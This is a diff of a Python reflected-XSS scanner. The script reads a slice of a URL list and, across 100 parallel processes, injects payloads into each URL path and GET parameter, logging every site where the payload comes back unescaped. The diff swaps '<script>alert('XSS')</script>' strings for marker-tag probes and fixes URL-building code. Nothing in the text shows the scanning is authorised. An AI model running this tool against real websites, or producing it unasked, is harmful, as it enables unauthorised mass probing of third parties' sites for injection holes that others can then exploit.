@@ -6,7 +6,7 @@ from multiprocessing import Pool
 
 urls = []
 
-attackPatterns = [
+attackPatterns_ = [
     ('"><script>alert(\'XSS\');</script>', '"><script>alert(\'XSS\');</script>'),
     ('--><script>alert(\'XSS\');</script><!--', '--><script>alert(\'XSS\');</script><!--'),
     ('\'><script>alert(\'XSS\');</script><!--', '\'><script>alert(\'XSS\');</script><!--'),
@@ -15,11 +15,28 @@ attackPatterns = [
     ('--><script>alert(\'XSS\');</script>', '--><script>alert(\'XSS\');</script>')
 ]
 
+attackPatterns = [
+    ('\'><bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('\"><bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('--><bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('><bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('<bafbcbeeecf>', '<bafbcbeeecf>'),
+    (';<bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('\'\'><bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('!--<bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('"<bafbcbeeecf>', '<bafbcbeeecf>'),
+    ('\'<bafbcbeeecf>', '<bafbcbeeecf>'),
+    (';><bafbcbeeecf>', '<bafbcbeeecf>'),
+]
+
 
 class Url:
 
     def parseParameters(self, url):
         params = {}
+        protocol = ''
+        domain = ''
+        path = ''
 
         if '?' in url:
             url = url[url.find('?') + 1:]
@@ -33,20 +50,20 @@ class Url:
     def __init__(self, url):
         if 'https://' in url:
             url = url[8:]
-            self.protocoll = 'https://'
+            self.protocol = 'https://'
         elif 'http://' in url:
             url = url[7:]
-            self.protocoll = 'http://'
+            self.protocol = 'http://'
         else:
             try:
                 requests.get('https://' + url)
-                self.protocoll = 'https://'
+                self.protocol = 'https://'
             except requests.RequestException:
                 try:
                     requests.get('http://' + url)
-                    self.protocoll = 'http://'
+                    self.protocol = 'http://'
                 except requests.RequestException:
-                    self.protocoll = ''
+                    self.protocol = ''
 
         if '/' in url:
             self.domain = url[:url.find('/')]
@@ -61,18 +78,14 @@ class Url:
         self.parameters = self.parseParameters(url)
 
     def getParameterString(self):
-        buf = ''
+        buf = '?'
         for (key, value) in self.parameters.items():
             buf += key + '=' + value + '&'
 
-        return buf
+        return buf[:-1]
 
     def getUrl(self):
-        parameterString = self.getParameterString()
-        if parameterString == '':
-            return self.protocoll + self.domain + self.path
-        else:
-            return self.protocoll + self.domain + self.path + '?' + self.getParameterString()
+        return self.protocol + self.domain + self.path + self.getParameterString()
 
     def setParamters(self, p):
         for (key, value) in p.items():
@@ -98,17 +111,21 @@ def attack(url):
     res = Result(url.domain + url.path)
     print(url.getUrl())
 
+    # attack plain get url
     for ap in attackPatterns:
-        # attack plain get url
         try:
             r = requests.get(url.getUrl() + ap[0], timeout=10)
             if ap[1] in r.text:
                 res.addSuccessPatterns(url.getUrl() + ap[0])
-            
-            # attack get parameters
-            injectedParameters = {}
+                break
+        except:
+            pass
 
-            if len(url.parameters.items()) != 0:
+    # attack get parameters        
+    if len(url.parameters.items()) != 0:
+        for ap in attackPatterns:
+            injectedParameters = {}
+            try:
                 for key, _ in url.parameters.items():
                     injectedParameters[key] = ap[0]
                 url.setParamters(injectedParameters)
@@ -117,8 +134,10 @@ def attack(url):
 
                 if ap[1] in r.text:
                     res.addSuccessPatterns(url.getUrl())
-        except:
-            pass
+                    break
+            except:
+                pass
+
     return res
 
 
@@ -126,7 +145,7 @@ def main():
     res = []
 
     with open('urls.txt', 'r', encoding="utf-8", errors="surrogateescape") as infile:
-        urls = [u.rstrip() for u in infile.readlines()[2000:3000]]
+        urls = [u.rstrip() for u in infile.readlines()[5000:6000]]
 
     with Pool(processes=100) as pool:
         res = pool.map(attack, [Url(url) for url in urls])
@@ -134,10 +153,10 @@ def main():
     buf = ''
     for r in res:
         if r.getSuccessPatterns() != []:
-            buf += r.getUrl()
-            buf += "Patterns:\n"
+            buf += '+\t' + r.getUrl()
+            buf += " patterns:\n"
             for p in r.getSuccessPatterns():
-                buf += '+\t' + p + '\n'
+                buf += p + '\n'
 
             buf += '--------------------------------------\n'
 
